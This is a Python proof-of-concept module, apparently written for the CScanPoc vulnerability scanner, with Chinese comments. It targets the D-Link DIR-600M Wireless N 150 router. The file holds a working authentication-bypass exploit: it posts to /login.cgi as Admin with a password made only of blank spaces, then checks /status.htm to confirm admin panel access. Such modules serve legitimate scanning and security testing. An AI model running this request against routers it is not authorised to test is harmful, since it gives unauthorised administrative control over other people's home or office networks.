# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time
import re

class Vuln(ABVuln):
    vuln_id = 'D-Link_0013' # 平台漏洞编号，留空
    name = 'D-Link DIR-600M Wireless N 150管理员密码绕过'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2017-05-26'  # 漏洞公布时间
    desc = '''
        After Successfully Connected to D-Link DIR-600M Wireless N 150
        Router(FirmWare Version : 3.04), Any User Can Easily Bypass The Router''s
        Admin Panel Just by Feeding Blank Spaces in the password Field.
         
        Its More Dangerous when your Router has a public IP with remote login
        enabled.
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1930.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DIR-600M Wireless N 150'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'fc3ed3b2-bcde-40df-b6fc-98b27c4e9c0c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            s = requests.session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101Firefox/45.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Referer': '{target}/login.htm'.format(target=self.target),
                'Cookie': 'SessionID=',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': '84'
            }
            data = 'username=Admin&password=+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&submit.htm%3Flogin.htm=Send'
            payload = '/login.cgi'
            url = self.target + payload
            r1 = s.post(url, headers=headers, data=data)
            time.sleep(1)
            r2 = s.get(self.target + '/status.htm')

            if r2.status_code == 200 and 'Wireless Router Status' in r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
